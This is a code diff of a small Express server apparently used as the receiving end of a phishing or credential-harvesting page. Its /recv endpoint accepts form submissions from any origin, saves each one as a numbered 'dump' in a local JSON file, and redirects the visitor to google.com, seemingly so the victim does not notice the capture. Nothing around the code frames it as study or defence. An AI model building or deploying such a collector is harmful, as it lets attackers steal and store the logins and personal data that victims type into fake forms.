@@ -1,17 +1,36 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const app = express();
+import express from 'express'
+import cors from 'cors'
+import fs from 'node:fs'
 
-app.use(bodyParser.urlencoded({ extended: true }));
+const app = express()
+app.use(cors())
+app.use(express.urlencoded({ extended: true }))
 
-app.post("/recv", (req, res) => {
-  for (const key in req.body) {
-    console.log(`\n${key}: ${req.body[key]}`);
+const db = './db.json'
+
+function loadDb() {
+  if (fs.existsSync(db)) {
+    return
   }
-  res.redirect("https://google.com");
-});
 
-const PORT = 8000;
-app.listen(PORT, () => {
-  console.log("Listen...");
-});
+  const emptyDb = {
+    dumps: [],
+  }
+
+  fs.writeFileSync(db, JSON.stringify(emptyDb, null, 2))
+}
+
+app.post('/recv', (req, res) => {
+  const data = JSON.parse(fs.readFileSync(db).toString())
+
+  data.dumps.push(req.body)
+  fs.writeFileSync(db, JSON.stringify(data, null, 2))
+
+  console.log(`- Dump ${data.dumps.length}`)
+  res.redirect('https://google.com')
+})
+
+app.listen(80, () => {
+  loadDb()
+  console.log('Listen...')
+})
